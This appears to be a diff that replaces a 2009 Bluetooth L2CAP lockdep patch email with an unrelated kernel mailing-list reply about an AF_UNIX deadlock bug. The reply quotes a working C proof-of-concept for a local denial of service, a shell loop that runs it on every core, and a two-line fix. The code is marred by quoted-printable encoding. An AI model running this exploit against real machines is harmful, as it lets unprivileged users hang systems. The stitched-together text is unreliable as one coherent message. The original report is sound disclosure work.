@@ -1,92 +1,146 @@
-From: Dave Young <hidave.darkstar-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: [PATCH 2/2] bluetooth: static lock key fix
-Date: Mon, 19 Oct 2009 14:28:30 +0800
-Message-ID: <20091019062830.GB4102@darkstar.vlan7>
+From: =?UTF-8?Q?Am=C3=A9rico_Wang?= <xiyou.wangcong@gmail.com>
+Subject: Re: [PATCH] AF_UNIX: Fix deadlock on connecting to shutdown socket
+Date: Mon, 19 Oct 2009 15:02:14 +0800
+Message-ID: <2375c9f90910190002m372edafq9a4c95d754640487@mail.gmail.com>
+References: <4ADC010C.5070809@hitachi.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: oliver-fJ+pQTUTwRTk1uMJSBkQmQ@public.gmane.org, netdev-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
-	linux-bluetooth-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: marcel-kz+m5ild9QBg9hUCZPvPmw@public.gmane.org
-Return-path: <linux-bluetooth-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Content-Disposition: inline
-Sender: linux-bluetooth-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: QUOTED-PRINTABLE
+Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
+	alan@lxorguk.ukuu.org.uk, davem@davemloft.net,
+	satoshi.oshima.fk@hitachi.com, hidehiro.kawai.ez@hitachi.com,
+	hideo.aoki.tk@hitachi.com
+To: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
+Return-path: <linux-kernel-owner+glk-linux-kernel-3=40m.gmane.org-S1753292AbZJSHCL@vger.kernel.org>
+In-Reply-To: <4ADC010C.5070809@hitachi.com>
+Sender: linux-kernel-owner@vger.kernel.org
 List-Id: netdev.vger.kernel.org
 
-When shutdown ppp connection, lockdep waring about non-static key
-will happen, it is caused by the lock is not initialized properly
-at that time.
+On Mon, Oct 19, 2009 at 2:02 PM, Tomoki Sekiyama
+<tomoki.sekiyama.qu@hitachi.com> wrote:
+> Hi,
+> I found a deadlock bug in UNIX domain socket, which makes able to DoS
+> attack against the local machine by non-root users.
+>
+> How to reproduce:
+> 1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
+> =C2=A0 =C2=A0namespace(*), and shutdown(2) it.
+> =C2=A02. Repeat connect(2)ing to the listening socket from the other =
+sockets
+> =C2=A0 =C2=A0until the connection backlog is full-filled.
+> =C2=A03. connect(2) takes the CPU forever. If every core is taken, th=
+e
+> =C2=A0 =C2=A0system hangs.
+>
+> PoC code: (Run as many times as cores on SMP machines.)
 
-Fix with tuning the lock/skb_queue_head init order
 
-[   94.339261] INFO: trying to register non-static key.
-[   94.342509] the code is fine but needs lockdep annotation.
-[   94.342509] turning off the locking correctness validator.
-[   94.342509] Pid: 0, comm: swapper Not tainted 2.6.31-mm1 #2
-[   94.342509] Call Trace:
-[   94.342509]  [<c0248fbe>] register_lock_class+0x58/0x241
-[   94.342509]  [<c024b5df>] ? __lock_acquire+0xb57/0xb73
-[   94.342509]  [<c024ab34>] __lock_acquire+0xac/0xb73
-[   94.342509]  [<c024b7fa>] ? lock_release_non_nested+0x17b/0x1de
-[   94.342509]  [<c024b662>] lock_acquire+0x67/0x84
-[   94.342509]  [<c04cd1eb>] ? skb_dequeue+0x15/0x41
-[   94.342509]  [<c054a857>] _spin_lock_irqsave+0x2f/0x3f
-[   94.342509]  [<c04cd1eb>] ? skb_dequeue+0x15/0x41
-[   94.342509]  [<c04cd1eb>] skb_dequeue+0x15/0x41
-[   94.342509]  [<c054a648>] ? _read_unlock+0x1d/0x20
-[   94.342509]  [<c04cd641>] skb_queue_purge+0x14/0x1b
-[   94.342509]  [<fab94fdc>] l2cap_recv_frame+0xea1/0x115a [l2cap]
-[   94.342509]  [<c024b5df>] ? __lock_acquire+0xb57/0xb73
-[   94.342509]  [<c0249c04>] ? mark_lock+0x1e/0x1c7
-[   94.342509]  [<f8364963>] ? hci_rx_task+0xd2/0x1bc [bluetooth]
-[   94.342509]  [<fab95346>] l2cap_recv_acldata+0xb1/0x1c6 [l2cap]
-[   94.342509]  [<f8364997>] hci_rx_task+0x106/0x1bc [bluetooth]
-[   94.342509]  [<fab95295>] ? l2cap_recv_acldata+0x0/0x1c6 [l2cap]
-[   94.342509]  [<c02302c4>] tasklet_action+0x69/0xc1
-[   94.342509]  [<c022fbef>] __do_softirq+0x94/0x11e
-[   94.342509]  [<c022fcaf>] do_softirq+0x36/0x5a
-[   94.342509]  [<c022fe14>] irq_exit+0x35/0x68
-[   94.342509]  [<c0204ced>] do_IRQ+0x72/0x89
-[   94.342509]  [<c02038ee>] common_interrupt+0x2e/0x34
-[   94.342509]  [<c024007b>] ? pm_qos_add_requirement+0x63/0x9d
-[   94.342509]  [<c038e8a5>] ? acpi_idle_enter_bm+0x209/0x238
-[   94.342509]  [<c049d238>] cpuidle_idle_call+0x5c/0x94
-[   94.342509]  [<c02023f8>] cpu_idle+0x4e/0x6f
-[   94.342509]  [<c0534153>] rest_init+0x53/0x55
-[   94.342509]  [<c0781894>] start_kernel+0x2f0/0x2f5
-[   94.342509]  [<c0781091>] i386_start_kernel+0x91/0x96
+Interesting...
 
-Reported-by: Oliver Hartkopp <oliver-fJ+pQTUTwRTk1uMJSBkQmQ@public.gmane.org>
-Signed-off-by: Dave Young <hidave.darkstar-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Tested-by: Oliver Hartkopp <oliver-fJ+pQTUTwRTk1uMJSBkQmQ@public.gmane.org>
----
-net/bluetooth/l2cap.c |    9 ++++++---
-1 file changed, 6 insertions(+), 3 deletions(-)
+I tried this with the following command:
 
---- linux-2.6.31.orig/net/bluetooth/l2cap.c	2009-10-09 08:32:46.000000000 +0800
-+++ linux-2.6.31/net/bluetooth/l2cap.c	2009-10-09 08:33:57.000000000 +0800
-@@ -555,12 +555,12 @@ static struct l2cap_conn *l2cap_conn_add
- 
- 	conn->feat_mask = 0;
- 
--	setup_timer(&conn->info_timer, l2cap_info_timeout,
--						(unsigned long) conn);
--
- 	spin_lock_init(&conn->lock);
- 	rwlock_init(&conn->chan_list.lock);
- 
-+	setup_timer(&conn->info_timer, l2cap_info_timeout,
-+						(unsigned long) conn);
-+
- 	conn->disc_reason = 0x13;
- 
- 	return conn;
-@@ -783,6 +783,9 @@ static void l2cap_sock_init(struct sock 
- 	/* Default config options */
- 	pi->conf_len = 0;
- 	pi->flush_to = L2CAP_DEFAULT_FLUSH_TO;
-+	skb_queue_head_init(TX_QUEUE(sk));
-+	skb_queue_head_init(SREJ_QUEUE(sk));
-+	INIT_LIST_HEAD(SREJ_LIST(sk));
- }
- 
- static struct proto l2cap_proto = {
+% for i in `seq 1 $(grep processor -c /proc/cpuinfo)`;
+do ./unix-socket-dos-exploit; echo "=3D=3D=3D=3D=3D$i=3D=3D=3D=3D";done
+Connection OK
+Connection OK
+=3D=3D=3D=3D=3D1=3D=3D=3D=3D
+Connection OK
+Connection OK
+=3D=3D=3D=3D=3D2=3D=3D=3D=3D
+Connection OK
+Connection OK
+=3D=3D=3D=3D=3D3=3D=3D=3D=3D
+Connection OK
+Connection OK
+=3D=3D=3D=3D=3D4=3D=3D=3D=3D
+
+My system doesn't hang at all.
+
+Am I missing something?
+
+Thanks!
+
+>
+> int main(void)
+> {
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0int ret;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0int csd;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0int lsd;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0struct sockaddr_un sun;
+>
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* make an abstruct name address (*) */
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0memset(&sun, 0, sizeof(sun));
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0sun.sun_family =3D PF_UNIX;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0sprintf(&sun.sun_path[1], "%d", getpid());
+>
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* create the listening socket and shutdow=
+n */
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0lsd =3D socket(AF_UNIX, SOCK_STREAM, 0);
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0bind(lsd, (struct sockaddr *)&sun, sizeof(=
+sun));
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0listen(lsd, 1);
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0shutdown(lsd, SHUT_RDWR);
+>
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0/* connect loop */
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0alarm(15); /* forcely exit the loop after =
+15 sec */
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0for (;;) {
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0csd =3D socket=
+(AF_UNIX, SOCK_STREAM, 0);
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0ret =3D connec=
+t(csd, (struct sockaddr *)&sun, sizeof(sun));
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0if (-1 =3D=3D =
+ret) {
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
+ =C2=A0 =C2=A0perror("connect()");
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
+ =C2=A0 =C2=A0break;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0}
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0puts("Connecti=
+on OK");
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0}
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0return 0;
+> }
+>
+> (*) Make sun_path[0] =3D 0 to use the abstruct namespace.
+> =C2=A0 =C2=A0If a file-based socket is used, the system doesn't deadl=
+ock because
+> =C2=A0 =C2=A0of context switches in the file system layer.
+>
+> Why this happens:
+> =C2=A0Error checks between unix_socket_connect() and unix_wait_for_pe=
+er() are
+> =C2=A0inconsistent. The former calls the latter to wait until the bac=
+klog is
+> =C2=A0processed. Despite the latter returns without doing anything wh=
+en the
+> =C2=A0socket is shutdown, the former doesn't check the shutdown state=
+ and
+> =C2=A0just retries calling the latter forever.
+>
+> Patch:
+> =C2=A0The patch below adds shutdown check into unix_socket_connect(),=
+ so
+> =C2=A0connect(2) to the shutdown socket will return -ECONREFUSED.
+>
+> Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
+> Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
+> ---
+> =C2=A0net/unix/af_unix.c | =C2=A0 =C2=A02 ++
+> =C2=A01 files changed, 2 insertions(+), 0 deletions(-)
+>
+> diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
+> index 51ab497..fc820cd 100644
+> --- a/net/unix/af_unix.c
+> +++ b/net/unix/af_unix.c
+> @@ -1074,6 +1074,8 @@ restart:
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0err =3D -ECONNREFUSED;
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0if (other->sk_state !=3D TCP_LISTEN)
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0goto out_unloc=
+k;
+> + =C2=A0 =C2=A0 =C2=A0 if (other->sk_shutdown & RCV_SHUTDOWN)
+> + =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 goto out_unlock;
+>
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0if (unix_recvq_full(other)) {
+> =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0err =3D -EAGAI=
+N;
